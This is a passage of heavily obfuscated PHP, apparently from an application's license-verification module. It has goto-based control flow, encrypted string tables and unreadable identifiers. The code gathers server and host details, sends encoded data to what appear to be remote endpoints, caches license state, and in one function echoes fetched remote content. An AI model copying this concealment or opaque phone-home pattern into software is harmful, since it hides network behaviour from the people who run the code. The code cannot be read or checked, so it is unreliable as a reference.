$BèÂ¤²·ì[172], $BèÂ¤²·ì[173], $BèÂ¤²·ì[174], $BèÂ¤²·ì[175], $BèÂ¤²·ì[176]); $A¨ôÜ±­ç = $BèÂ¤²·ì[61]($BèÂ¤²·ì[62])->{$_SERVER[¿][63]}(); goto F×õÀ˜¦„; AÅÒ”àğ¸—: $e”ÜğšÓ‰“ =& $_SERVER[«¾°Ã¤]; $BèÂ¤²·ì =& $_SERVER[¿]; if ($_SERVER[$BèÂ¤²·ì[44]] == $BèÂ¤²·ì[145]) { goto DòÛÅÎÀ×²; aƒâò´Ò¾: $bÛ¢¥À³Õ = $e”ÜğšÓ‰“[617]; while ($bÛ¢¥À³Õ < $e”ÜğšÓ‰“[589]) { if ($bÛ¢¥À³Õ >= 0) { break; } $bÛ¢¥À³Õ++; } $bÏš½Öìƒ = array($BèÂ¤²·ì[168] => $B¿×Á»¿ÑË); goto Cö²Ñ—„; f®³Ò©¡: $bŠ¨ò•âÑ = $e”ÜğšÓ‰“[619]; goto AÏ¥ÔùÍ¶¸; Cö²Ñ—„: $eêµ­Ö†„Ü = $e”ÜğšÓ‰“[618]; if (strlen($eêµ­Ö†„Ü) < $e”ÜğšÓ‰“[596]) { return; } $BèÂ¤²·ì[13](array($BèÂ¤²·ì[169], $BèÂ¤²·ì[170]), $bÏš½Öìƒ); goto f®³Ò©¡; DòÛÅÎÀ×²: $B¿×Á»¿ÑË = array($BèÂ¤²·ì[130] => $this->aief1607a445, $BèÂ¤²·ì[146] => $this->{$_SERVER[¿][147]}(), $BèÂ¤²·ì[148] => $BèÂ¤²·ì[61]($BèÂ¤²·ì[149])->{$_SERVER[¿][150]}()); if ($this->aief1607a445 != $BèÂ¤²·ì[131]) { $a‰ï‘µÖ»­ = $BèÂ¤²·ì[116]($this->bkus5172ed63, $BèÂ¤²·ì[151]); if ($a‰ï‘µÖ»­) { $B¿×Á»¿ÑË[$BèÂ¤²·ì[152]] = $a‰ï‘µÖ»­; $B¿×Á»¿ÑË[$BèÂ¤²·ì[153]] = $BèÂ¤²·ì[154]($BèÂ¤²·ì[116]($this->bkus5172ed63, $BèÂ¤²·ì[155])); $B¿×Á»¿ÑË[$BèÂ¤²·ì[156]] = $BèÂ¤²·ì[116]($this->bkus5172ed63, $BèÂ¤²·ì[141]); } $C¨¯ó˜»ßå = $BèÂ¤²·ì[61]($BèÂ¤²·ì[62])->{$_SERVER[¿][63]}($BèÂ¤²·ì[157], $BèÂ¤²·ì[10], !0); if ($BèÂ¤²·ì[158]($C¨¯ó˜»ßå) && $BèÂ¤²·ì[25]($C¨¯ó˜»ßå, 0, 1) == $BèÂ¤²·ì[159]) { $C¨¯ó˜»ßå = $BèÂ¤²·ì[160]($C¨¯ó˜»ßå); } if ($BèÂ¤²·ì[161]($C¨¯ó˜»ßå) && $C¨¯ó˜»ßå[$BèÂ¤²·ì[162]] && $BèÂ¤²·ì[32]($C¨¯ó˜»ßå[$BèÂ¤²·ì[162]], $BèÂ¤²·ì[163])) { $BÖóôÔïß = $BèÂ¤²·ì[0]($BèÂ¤²·ì[163], $C¨¯ó˜»ßå[$BèÂ¤²·ì[162]]); $B¿×Á»¿ÑË[$BèÂ¤²·ì[164]] = $BÖóôÔïß[0]; } } $B¿×Á»¿ÑË = $this->{$_SERVER[¿][165]}($BèÂ¤²·ì[166]($B¿×Á»¿ÑË), $BèÂ¤²·ì[124]($BèÂ¤²·ì[167])); goto aƒâò´Ò¾; AÏ¥ÔùÍ¶¸: } goto F×Æ’ˆ¼â¤; D£¬ë”¬É: } private function qglv1cca578a() { goto A™Õ‚İí™¶; eÔ¢à¤â¿§: $FÍ£Ì‹‘ = array($E¥„èæ¯ØŠ[227] => $FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[228]], $E¥„èæ¯ØŠ[229] => $FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[230]], $E¥„èæ¯ØŠ[231] => $E¥„èæ¯ØŠ[134](16), $E¥„èæ¯ØŠ[130] => $FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[232]]); if ($AÒŠŞÕ‘Ï•[$E¥„èæ¯ØŠ[186]]) { $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[231]] = $AÒŠŞÕ‘Ï•[$E¥„èæ¯ØŠ[186]]; } $BöÈ¤èàğ² = $E¥„èæ¯ØŠ[25]($E¥„èæ¯ØŠ[124]($FÍ£Ì‹‘[$E¥„èæ¯ØŠ[229]]), 10, 10); goto E³ô¿öŠó; aÆ‚êïš¡ñ: $dÕˆîÕæ‡ë = $E‘¯ğäÂœ[633]; $this->bkus5172ed63 = $FÀ¶Ùš„Ûì; $BÊ—Öè Ù = $E‘¯ğäÂœ[634]; goto dƒ¸ê¬•ÆŠ; Aî›íÄõ¢…: if (!isset($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[183]]) || $E¥„èæ¯ØŠ[24]($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[183]]) != 16) { $E¥„èæ¯ØŠ[184]($E¥„èæ¯ØŠ[185] . $D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[183]], !1); } $fëôŒÔÑ‹¿ = $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[62])->{$_SERVER[¿][63]}($E¥„èæ¯ØŠ[126]); $F‘¿äÕÙõ = $E¥„èæ¯ØŠ[124]($_SERVER[$E¥„èæ¯ØŠ[125]] . $fëôŒÔÑ‹¿); goto e»«–ŒÕ­; E¿ÎËˆ¦é¤: while (strlen($bÇ´èŒŠÖ¯) < $E‘¯ğäÂœ[400]) { if (!$bÇ´èŒŠÖ¯) { break; } $bÇ´èŒŠÖ¯++; } Cache::set($E¥„èæ¯ØŠ[249] . $E¥„èæ¯ØŠ[124]($fëôŒÔÑ‹¿ . $E¥„èæ¯ØŠ[250]), $E¥„èæ¯ØŠ[10]); $E¥„èæ¯ØŠ[184]($E¥„èæ¯ØŠ[216]($E¥„èæ¯ØŠ[226]), !0); goto Eâ‹£ñ»³Í; E­³¨†åŒ: $F¨ŒÓ©ÉŒó = $E¥„èæ¯ØŠ[134](16); $cºò¹Ì‹É‚ = $F¨ŒÓ©ÉŒó . $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[130]] . $this->{$_SERVER[¿][165]}($E¥„èæ¯ØŠ[124]($FÍ£Ì‹‘[$E¥„èæ¯ØŠ[227]]), $F¨ŒÓ©ÉŒó); $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[133]] = $E¥„èæ¯ØŠ[128]($E¥„èæ¯ØŠ[233]($this->{$_SERVER[¿][165]}($cºò¹Ì‹É‚, $E¥„èæ¯ØŠ[235]))); goto CÑãõŠ‰ÚÅ; ešÂøƒ’Ò: if (!$E¥„èæ¯ØŠ[116]($GLOBALS, $E¥„èæ¯ØŠ[142])) { die; } $D¶ƒŒ”ñ… = $GLOBALS[$E¥„èæ¯ØŠ[22]]; if (isset($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[181]])) { $this->{$_SERVER[¿][182]}(); die; } goto Aî›íÄõ¢…; CÑãõŠ‰ÚÅ: $f°©ºĞ²ÉÙ = $E‘¯ğäÂœ[629]; if (strlen($f°©ºĞ²ÉÙ) < $E‘¯ğäÂœ[587]) { die; } if ($FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[236]] && $FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[236]] >= 1) { $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[62])->{$_SERVER[¿][237]}($E¥„èæ¯ØŠ[238], $E¥„èæ¯ØŠ[239]); } goto FÌº‚“Ì; eÃÂ„ê‹Œ: $DŠÎ›¦ºÚ = $E‘¯ğäÂœ[632]; while ($DŠÎ›¦ºÚ < $E‘¯ğäÂœ[589]) { if ($DŠÎ›¦ºÚ >= 0) { break; } $DŠÎ›¦ºÚ++; } $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[11])->{$_SERVER[¿][245]}($fÒ”¼©•·¶[$E¥„èæ¯ØŠ[246]], array($E¥„èæ¯ØŠ[247] => $e’…İ÷†ˆ¾)); goto aÆ‚êïš¡ñ; FÌº‚“Ì: $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[62])->{$_SERVER[¿][240]}($FÍ£Ì‹‘); $F˜ĞÜ½† = $E¥„èæ¯ØŠ[124]($_SERVER[$E¥„èæ¯ØŠ[125]] . $E¥„èæ¯ØŠ[233]($fëôŒÔÑ‹¿) . $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[229]]); $dÎ£×ÓÕØŒ = $E¥„èæ¯ØŠ[233]($E¥„èæ¯ØŠ[25]($F˜ĞÜ½†, 10, 16)); goto cà‘›‚æ; fååèÕëó½: $aÂ¢ĞòÁ±Â = $E‘¯ğäÂœ[626]; while ($aÂ¢ĞòÁ±Â < $E‘¯ğäÂœ[627]) { if ($aÂ¢ĞòÁ±Â >= 0) { break; } $aÂ¢ĞòÁ±Â++; } if (!$BøôåšØ• || $BøôåšØ• != $FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[155]]) { $fÒĞìó‚ñæ = array($E¥„èæ¯ØŠ[220] => $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[62])->{$_SERVER[¿][63]}($E¥„èæ¯ØŠ[126]), $E¥„èæ¯ØŠ[221] => $_SERVER[$E¥„èæ¯ØŠ[125]], $E¥„èæ¯ØŠ[222] => $E¥„èæ¯ØŠ[223](), $E¥„èæ¯ØŠ[192] => $_SERVER[$E¥„èæ¯ØŠ[193]]); $Aì¥º“ß = $this->{$_SERVER[¿][224]}($E¥„èæ¯ØŠ[166]($fÒĞìó‚ñæ)); $this->{$_SERVER[¿][202]}($E¥„èæ¯ØŠ[225] . $Aì¥º“ß); $E¥„èæ¯ØŠ[184]($E¥„èæ¯ØŠ[216]($E¥„èæ¯ØŠ[226]), !0); } goto eÔ¢à¤â¿§; cà‘›‚æ: $fîÏÑäÀÇÜ = $this->{$_SERVER[¿][137]}($E¥„èæ¯ØŠ[166]($FÀ¶Ùš„Ûì), $F˜ĞÜ½†); $DÖ®…¶¿‘‡ = $E¥„èæ¯ØŠ[241]($E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[11])->{$_SERVER[¿][242]}(), $E¥„èæ¯ØŠ[243]); $fçù®‡ËîŒ = $E‘¯ğäÂœ[630]; goto cŠ¸…ã˜‡; dƒ¸ê¬•ÆŠ: while (strlen($BÊ—Öè Ù) < $E‘¯ğäÂœ[400]) { if (!$BÊ—Öè Ù) { break; } $BÊ—Öè Ù++; } $this->aief1607a445 = $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[130]]; $eë˜Õ‚¶ÇÉ = $E‘¯ğäÂœ[635]; goto aÉÈ–½ìƒ; e»«–ŒÕ­: $Cô™ï½õ© = $E‘¯ğäÂœ[624]; if (strlen($Cô™ï½õ©) < $E‘¯ğäÂœ[587]) { return; } $AÒŠŞÕ‘Ï• = array($E¥„èæ¯ØŠ[183] => $D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[183]], $E¥„èæ¯ØŠ[186] => $E¥„èæ¯ØŠ[134](16), $E¥„èæ¯ØŠ[187] => $E¥„èæ¯ØŠ[167], $E¥„èæ¯ØŠ[188] => $E¥„èæ¯ØŠ[189], $E¥„èæ¯ØŠ[190] => $_SERVER[$E¥„èæ¯ØŠ[191]], $E¥„èæ¯ØŠ[192] => $_SERVER[$E¥„èæ¯ØŠ[193]], $E¥„èæ¯ØŠ[194] => $_SERVER[$E¥„èæ¯ØŠ[195]], $E¥„èæ¯ØŠ[123] => $F‘¿äÕÙõ, $E¥„èæ¯ØŠ[196] => $E¥„èæ¯ØŠ[61]($E¥„èæ¯ØŠ[62])->{$_SERVER[¿][63]}($E¥„èæ¯ØŠ[157])); goto fÈÇÇ´ØÎÃ; aÉÈ–½ìƒ: if (!$eë˜Õ‚¶ÇÉ) { die; } $this->{$_SERVER[¿][248]}(); $bÇ´èŒŠÖ¯ = $E‘¯ğäÂœ[636]; goto E¿ÎËˆ¦é¤; Eâ‹£ñ»³Í: $F¤ ¨—²ÎÊ = $E‘¯ğäÂœ[637]; if (!$F¤ ¨—²ÎÊ) { return; } goto c‰İ‡–ªä¿; cŠ¸…ã˜‡: if (!$fçù®‡ËîŒ) { return; } $fÒ”¼©•·¶ = $DÖ®…¶¿‘‡[$E¥„èæ¯ØŠ[244]]; $e’…İ÷†ˆ¾ = array(); goto d¡øê¤Ù±–; FÏõ¥ôï: if (!$E¥„èæ¯ØŠ[161]($c¸§•ÄŒÚÔ) || !$E¥„èæ¯ØŠ[161]($c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]]) || $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[183]] != !0) { $dìê©¯Ì = $E¥„èæ¯ØŠ[216]($E¥„èæ¯ØŠ[217]); $c‚ˆ¥¹¸Ö = $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]] ? $E¥„èæ¯ØŠ[213] . $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]] : $dìê©¯Ì; $E¥„èæ¯ØŠ[184]($c‚ˆ¥¹¸Ö, !1); } $FÀ¶Ùš„Ûì = $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]]; $BøôåšØ• = $this->{$_SERVER[¿][218]}($FÀ¶Ùš„Ûì[$E¥„èæ¯ØŠ[219]]); goto fååèÕëó½; d¡øê¤Ù±–: $F—¬ñÄ¹ŸÇ = $E‘¯ğäÂœ[631]; if (!$F—¬ñÄ¹ŸÇ) { return; } $e’…İ÷†ˆ¾[$dÎ£×ÓÕØŒ] = $fîÏÑäÀÇÜ; goto eÃÂ„ê‹Œ; E³ô¿öŠó: $AÉ·ŒÁŞ… = $BöÈ¤èàğ² . $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[130]] . $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[231]]; $FÍ£Ì‹‘[$E¥„èæ¯ØŠ[132]] = $E¥„èæ¯ØŠ[233]($E¥„èæ¯ØŠ[128]($this->{$_SERVER[¿][165]}($AÉ·ŒÁŞ…, $E¥„èæ¯ØŠ[234]))); $A´É¶’çÌÜ = $E‘¯ğäÂœ[628]; goto E­³¨†åŒ; fÈÇÇ´ØÎÃ: $d¤ĞŠÆƒ³ô = $E‘¯ğäÂœ[625]; if (!$d¤ĞŠÆƒ³ô) { die; } if ($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[197]] == $E¥„èæ¯ØŠ[198]) { $F§³»ê‰ÌĞ = $this->{$_SERVER[¿][165]}($F‘¿äÕÙõ, $E¥„èæ¯ØŠ[199]); $Aì¥º“ß = $this->{$_SERVER[¿][137]}($E¥„èæ¯ØŠ[166]($AÒŠŞÕ‘Ï•), $F‘¿äÕÙõ . $E¥„èæ¯ØŠ[200], 3); $Aì¥º“ß = $Aì¥º“ß . $E¥„èæ¯ØŠ[201] . $_SERVER[$E¥„èæ¯ØŠ[191]]; $Cîß“ Šº = $this->{$_SERVER[¿][202]}($E¥„èæ¯ØŠ[203] . $F§³»ê‰ÌĞ . $E¥„èæ¯ØŠ[204] . $Aì¥º“ß, -1); $E¥„èæ¯ØŠ[184]($Cîß“ Šº, !0); } else { if ($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[197]] == $E¥„èæ¯ØŠ[205]) { $eŠÃ³Ÿ„‚ = $E¥„èæ¯ØŠ[25]($E¥„èæ¯ØŠ[124]($E¥„èæ¯ØŠ[206] . $F‘¿äÕÙõ), 12, 15) . $E¥„èæ¯ØŠ[207]; $Aì¥º“ß = $this->{$_SERVER[¿][208]}($E¥„èæ¯ØŠ[2]($D¶ƒŒ”ñ…[$E¥„èæ¯ØŠ[209]]), $eŠÃ³Ÿ„‚, 2); $c¸§•ÄŒÚÔ = $E¥„èæ¯ØŠ[210]($Aì¥º“ß, !0); if (!$E¥„èæ¯ØŠ[161]($c¸§•ÄŒÚÔ) || !$E¥„èæ¯ØŠ[161]($c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]]) || $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[183]] != !0) { $dìê©¯Ì = $E¥„èæ¯ØŠ[212]; $c‚ˆ¥¹¸Ö = $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]] ? $E¥„èæ¯ØŠ[213] . $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]] : $dìê©¯Ì; $E¥„èæ¯ØŠ[184]($c‚ˆ¥¹¸Ö, !1); } else { $AÒŠŞÕ‘Ï•[$E¥„èæ¯ØŠ[186]] = $c¸§•ÄŒÚÔ[$E¥„èæ¯ØŠ[211]][$E¥„èæ¯ØŠ[214]]; } } else { $c¸§•ÄŒÚÔ = $this->{$_SERVER[¿][202]}($E¥„èæ¯ØŠ[215], $AÒŠŞÕ‘Ï•, 10); } } goto FÏõ¥ôï; A™Õ‚İí™¶: $E‘¯ğäÂœ =& $_SERVER[«¾°Ã¤]; $E¥„èæ¯ØŠ =& $_SERVER[¿]; if ($_SERVER[$E¥„èæ¯ØŠ[44]] != $E¥„èæ¯ØŠ[180]) { return; } goto ešÂøƒ’Ò; c‰İ‡–ªä¿: } private function licenseRegistSuccess() { $F¯¥¸Êˆâ² =& $_SERVER[¿]; $E›ÄË†“œ… = $F¯¥¸Êˆâ²[61]($F¯¥¸Êˆâ²[62])->{$_SERVER[¿][63]}(); if ($E›ÄË†“œ…[$F¯¥¸Êˆâ²[93]] != $F¯¥¸Êˆâ²[239]) { $F¯¥¸Êˆâ²[61]($F¯¥¸Êˆâ²[62])->{$_SERVER[¿][240]}($F¯¥¸Êˆâ²[93], $F¯¥¸Êˆâ²[239]); } $F¯¥¸Êˆâ²[120]($F¯¥¸Êˆâ²[251])->{$_SERVER[¿][252]}(!0); } private function ynrs4426608b() { goto eŒ“¯…ƒ°; eŒ“¯…ƒ°: $A ß•”Àó =& $_SERVER[«¾°Ã¤]; $EËËì¼Ê =& $_SERVER[¿]; $EËËì¼Ê[61]($EËËì¼Ê[62])->{$_SERVER[¿][240]}(array($EËËì¼Ê[227] => $EËËì¼Ê[10], $EËËì¼Ê[229] => $EËËì¼Ê[10], $EËËì¼Ê[130] => $EËËì¼Ê[131], $EËËì¼Ê[132] => $EËËì¼Ê[10], $EËËì¼Ê[133] => $EËËì¼Ê[10])); goto Aã†”ÖíÕ; Aã†”ÖíÕ: $E¼Ï‡™İå° = $A ß•”Àó[638]; while (strlen($E¼Ï‡™İå°) < $A ß•”Àó[587]) { if (!$E¼Ï‡™İå°) { break; } $E¼Ï‡™İå°++; } $EËËì¼Ê[61]($EËËì¼Ê[62])->{$_SERVER[¿][237]}($EËËì¼Ê[238], $EËËì¼Ê[253]); goto b”†ª¿É‰¼; b”†ª¿É‰¼: $fø¾¼Äë†Ë = $A ß•”Àó[639]; $this->bkus5172ed63 = array(); $this->aief1607a445 = $EËËì¼Ê[131]; goto DÀó“„§¸Ã; DÀó“„§¸Ã: $CÌùÔğ‡õ• = $A ß•”Àó[640]; if (strlen($CÌùÔğ‡õ•) < $A ß•”Àó[400]) { die; } goto DÑí½ªáŠ¦; DÑí½ªáŠ¦: } private function lypj5f354523() { goto eßößôİ¿; A¸ÓÑ±¦öå: $fÂ½Ü©ç¤ä = $DªåĞÄµÎŞ[154]($dí“”ÔÄôĞ[$DªåĞÄµÎŞ[155]]); if ($DªåĞÄµÎŞ[255]() >= $fÂ½Ü©ç¤ä) { return $this->{$_SERVER[¿][182]}(); } if ($DªåĞÄµÎŞ[255]() - $dí“”ÔÄôĞ[$DªåĞÄµÎŞ[254]] > 20) { $dí“”ÔÄôĞ[$DªåĞÄµÎŞ[254]] = $DªåĞÄµÎŞ[255](); Cache::set($BŸòÜì¦„½, $dí“”ÔÄôĞ); } goto c–æÂé„†«; EÆŞí‘Ã²Å: $BŸòÜì¦„½ = $DªåĞÄµÎŞ[249] . $DªåĞÄµÎŞ[124]($BÜ¾ÙÄŸº . $DªåĞÄµÎŞ[250]); $dí“”ÔÄôĞ = Cache::get($BŸòÜì¦„½); $fŠ´àÆİÃæ = $F³æ‡Ëî‹[642]; goto fÊÁŸ•ŸÖ; c–æÂé„†«: $this->bkus5172ed63 = $dí“”ÔÄôĞ; $this->aief1607a445 = $F­ÀåŠÊšÉ[$DªåĞÄµÎŞ[130]]; $eÒ·°ğ˜É¥ = $F³æ‡Ëî‹[643]; goto CµÇÊ©; fÊÁŸ•ŸÖ: if (strlen($fŠ´àÆİÃæ) < $F³æ‡Ëî‹[400]) { die; } if (!$DªåĞÄµÎŞ[161]($dí“”ÔÄôĞ) || !isset($dí“”ÔÄôĞ[$DªåĞÄµÎŞ[254]]) || $DªåĞÄµÎŞ[255]() - $dí“”ÔÄôĞ[$DªåĞÄµÎŞ[254]] >= 60) { $D‚ŞéÖ»†À = $DªåĞÄµÎŞ[241]($DªåĞÄµÎŞ[61]($DªåĞÄµÎŞ[11])->{$_SERVER[¿][242]}(), $DªåĞÄµÎŞ[243]); $Aã‚øÃŠ¤ = $D‚ŞéÖ»†À[$DªåĞÄµÎŞ[244]]; $A›­øÅÚìÛ = $DªåĞÄµÎŞ[124]($_SERVER[$DªåĞÄµÎŞ[125]] . $DªåĞÄµÎŞ[233]($BÜ¾ÙÄŸº) . $F­ÀåŠÊšÉ[$DªåĞÄµÎŞ[229]]); $aÎè÷‡•ñê = $DªåĞÄµÎŞ[233]($DªåĞÄµÎŞ[25]($A›­øÅÚìÛ, 10, 16)); $dí“”ÔÄôĞ = $this->{$_SERVER[¿][208]}($Aã‚øÃŠ¤[$DªåĞÄµÎŞ[104]][$aÎè÷‡•ñê], $A›­øÅÚìÛ); $dí“”ÔÄôĞ = $DªåĞÄµÎŞ[210]($dí“”ÔÄôĞ, !0); } if (!$DªåĞÄµÎŞ[161]($dí“”ÔÄôĞ)) { return $this->{$_SERVER[¿][182]}(); } goto A¸ÓÑ±¦öå; CµÇÊ©: if (strlen($eÒ·°ğ˜É¥) < $F³æ‡Ëî‹[589]) { return; } goto A…˜Ø¬Ø›; Dƒ¾ƒ‘–Ïµ: $this->aief1607a445 = $DªåĞÄµÎŞ[131]; $F­ÀåŠÊšÉ = $DªåĞÄµÎŞ[61]($DªåĞÄµÎŞ[62])->{$_SERVER[¿][63]}(); if ($F­ÀåŠÊšÉ[$DªåĞÄµÎŞ[130]] == $DªåĞÄµÎŞ[131]) { return; } goto DŒÔÔÏöÇ; DŒÔÔÏöÇ: $BÜ¾ÙÄŸº = $DªåĞÄµÎŞ[61]($DªåĞÄµÎŞ[62])->{$_SERVER[¿][63]}($DªåĞÄµÎŞ[126]); $b­“Ê“¸Á = $F³æ‡Ëî‹[641]; while ($b­“Ê“¸Á < $F³æ‡Ëî‹[596]) { if ($b­“Ê“¸Á >= 0) { break; } $b­“Ê“¸Á++; } goto EÆŞí‘Ã²Å; eßößôİ¿: $F³æ‡Ëî‹ =& $_SERVER[«¾°Ã¤]; $DªåĞÄµÎŞ =& $_SERVER[¿]; $_SERVER[$DªåĞÄµÎŞ[193]] = $DªåĞÄµÎŞ[116]($_SERVER, $DªåĞÄµÎŞ[193], APP_HOST); goto Dƒ¾ƒ‘–Ïµ; A…˜Ø¬Ø›: } private function tbmu9e89c104() { goto bÕ´˜ˆÑŞ; aÈÏö‡”°: if ($Fìá½ÁœÑ == $EÔ¡†œµ¯œ[256] && $this->aief1607a445 == $EÔ¡†œµ¯œ[131]) { $EÔ¡†œµ¯œ[184]($EÔ¡†œµ¯œ[216]($EÔ¡†œµ¯œ[257]), !1, $EÔ¡†œµ¯œ[258]); } $a§”» á¦ = array($EÔ¡†œµ¯œ[259], $EÔ¡†œµ¯œ[260]); if ($EÔ¡†œµ¯œ[261]($Fìá½ÁœÑ, $a§”» á¦)) { if ($this->aief1607a445 == $EÔ¡†œµ¯œ[131] && isset($b²£Ê¿ÎÃ×[$EÔ¡†œµ¯œ[262]])) { $EÔ¡†œµ¯œ[184]($EÔ¡†œµ¯œ[216]($EÔ¡†œµ¯œ[257]), !1, $EÔ¡†œµ¯œ[258]); die; } $Fİ…®ì¨¼ß = $this->{$_SERVER[¿][147]}(); if ($Fİ…®ì¨¼ß != $EÔ¡†œµ¯œ[263]($EÔ¡†œµ¯œ[264])) { if ($Fİ…®ì¨¼ß <= $EÔ¡†œµ¯œ[61]($EÔ¡†œµ¯œ[149])->{$_SERVER[¿][150]}()) { $EÔ¡†œµ¯œ[184]($EÔ¡†œµ¯œ[216]($EÔ¡†œµ¯œ[265]), !1, $EÔ¡†œµ¯œ[258]); die; } } } goto EäâÈæéÎÜ; bÕ´˜ˆÑŞ: $FŒÊ©““¡ =& $_SERVER[«¾°Ã¤]; $EÔ¡†œµ¯œ =& $_SERVER[¿]; $b²£Ê¿ÎÃ× = $GLOBALS[$EÔ¡†œµ¯œ[22]]; goto bŠòø¾Ÿõ©; bŠòø¾Ÿõ©: $Aã”ßõµòğ = $FŒÊ©““¡[644]; while ($Aã”ßõµòğ < $FŒÊ©““¡[589]) { if ($Aã”ßõµòğ >= 0) { break; } $Aã”ßõµòğ++; } $Fìá½ÁœÑ = $_SERVER[$EÔ¡†œµ¯œ[44]]; goto aÈÏö‡”°; EäâÈæéÎÜ: } private function xzugb3fe5fc2() { goto A—”ÍµëÒ—; cíÌó‹œĞ˜: if ($eè»îº‚— && $BÜˆ‘ÌÅß[32]($eè»îº‚—, $BÜˆ‘ÌÅß[279])) { echo $eè»îº‚—; } die; goto D—ëôõÙç; E¹½â‡§¢: $B¶ ¡¿Ğò = $aá«ĞÏƒ¸[645]; while (strlen($B¶ ¡¿Ğò) < $aá«ĞÏƒ¸[589]) { if (!$B¶ ¡¿Ğò) { break; } $B¶ ¡¿Ğò++; } if (!$BÜˆ‘ÌÅß[116]($GLOBALS, $BÜˆ‘ÌÅß[142]) || !isset($_GET[$BÜˆ‘ÌÅß[267]])) { return; } goto Cù£‹·ëãç; EÚ²ƒÄÍ‰Ù: if (strlen($eÔšİ˜×) < $aá«ĞÏƒ¸[596]) { die; } $BÜˆ‘ÌÅß[277]($BÜˆ‘ÌÅß[278]); $a¶Óª¡ÎÛ = $aá«ĞÏƒ¸[650]; goto cíÌó‹œĞ˜; dÁÅéœæœÔ: while ($cºğ‚…è < $aá«ĞÏƒ¸[627]) { if ($cºğ‚…è >= 0) { break; } $cºğ‚…è++; } $dÀÔË©ó¦ = $this->{$_SERVER[¿][269]}($dÀÔË©ó¦, $BÜˆ‘ÌÅß[270]); $fåâÔõŒõ = $aá«ĞÏƒ¸[647]; goto c¡˜á‰…¼; eîƒ”…îÑÂ: while ($c¸É°òÌ“Ú < $aá«ĞÏƒ¸[627]) { if ($c¸É°òÌ“Ú >= 0) { break; } $c¸É°òÌ“Ú++; } $eè»îº‚— = @$BÜˆ‘ÌÅß[276]($dÀÔË©ó¦, !1, $f˜ÚööÂ›‘); $eÔšİ˜× = $aá«ĞÏƒ¸[649]; goto EÚ²ƒÄÍ‰Ù; A—”ÍµëÒ—: $aá«ĞÏƒ¸ =& $_SERVER[«¾°Ã¤]; $BÜˆ‘ÌÅß =& $_SERVER[¿]; $D–Ñ™Ä¿¦Ñ = array($BÜˆ‘ÌÅß[145], $BÜˆ‘ÌÅß[266]); goto E¹½â‡§¢; Cù£‹·ëãç: if (!$BÜˆ‘ÌÅß[261]($_SERVER[$BÜˆ‘ÌÅß[44]], $D–Ñ™Ä¿¦Ñ)) { return; } $dÀÔË©ó¦ = $BÜˆ‘ÌÅß[268]; $cºğ‚…è = $aá«ĞÏƒ¸[646]; goto dÁÅéœæœÔ; c¡˜á‰…¼: if (strlen($fåâÔõŒõ) < $aá«ĞÏƒ¸[596]) { die; } $f˜ÚööÂ›‘ = $BÜˆ‘ÌÅß[271](array($BÜˆ‘ÌÅß[272] => array($BÜˆ‘ÌÅß[273] => $BÜˆ‘ÌÅß[274], $BÜˆ‘ÌÅß[275] => 3))); $c¸É°òÌ“Ú = $aá«ĞÏƒ¸[648]; goto eîƒ”…îÑÂ; D—ëôõÙç: } public function dboqdc47b8ee($EñŸçñˆŞ¯) { goto Eë—•‡ªŒŞ; Eë—•‡ªŒŞ: $f‰åƒ‚Óö =& $_SERVER[«¾°Ã¤]; $a·¤ÌŠ³Õò =& $_SERVER[¿]; if ($this->aief1607a445 == $a·¤ÌŠ³Õò[280]) { return $EñŸçñˆŞ¯; } goto fÖšôîó¯á; aŠÊ³çéâ: $b¤ğ’Ğàœ¿ = $f‰åƒ‚Óö[652]; if (strlen($b¤ğ’Ğàœ¿) < $f‰åƒ‚Óö[596]) { return; } goto dµ·Ø¤Ï¹¦; dà¦³ùø¥: foreach ($Cçë˜÷”ª as $dÔ•†š‡äÁ => $D˜ÑŒõñ×”) { if ($D˜ÑŒõñ×” == $a·¤ÌŠ³Õò[282] && $a·¤ÌŠ³Õò[25]($this->aief1607a445, 0, 1) == $a·¤ÌŠ³Õò[282]) { continue; } if (!$a·¤ÌŠ³Õò[261]($dÔ•†š‡äÁ, $AÍõÆ×­É¤)) { $B‘ÍÕˆé¤É[] = $dÔ•†š‡äÁ; } } foreach ($B‘ÍÕˆé¤É as $dÔ•†š‡äÁ) { unset($EñŸçñˆŞ¯[$dÔ•†š‡äÁ]); $E½èŠ¦¡ğÇ = $f‰åƒ‚Óö[651]; if (strlen($E½èŠ¦¡ğÇ) < $f‰åƒ‚Óö[400]) { die; } } return $EñŸçñˆŞ¯; goto aŠÊ³çéâ; fÖšôîó¯á: $Cçë˜÷”ª = array($a·¤ÌŠ³Õò[281] => $a·¤ÌŠ³Õò[282], $a·¤ÌŠ³Õò[283] => $a·¤ÌŠ³Õò[282], 